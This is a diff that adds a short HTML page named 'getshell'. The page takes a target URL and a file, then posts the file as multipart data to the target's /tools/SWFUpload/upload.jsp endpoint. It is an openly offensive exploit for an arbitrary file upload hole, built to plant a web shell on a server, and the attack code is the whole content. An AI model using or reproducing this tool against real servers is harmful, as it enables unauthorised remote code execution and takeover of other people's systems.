@@ -1,0 +1,13 @@
+<head>
+	<script>
+	function getshell() {
+		document.getshellform.action=document.getElementById("host").value + "/tools/SWFUpload/upload.jsp";
+		getshellform.submit();
+	}
+</script>
+</head>
+<form name="getshellform" method='post' action=''  enctype="multipart/form-data" > 
+Url: <input type="text" id="host" /><br>
+File: <input type="file" id="file" name="test"/><br>
+<button onclick="getshell();" value="getshell">getshell</button>
+</form>
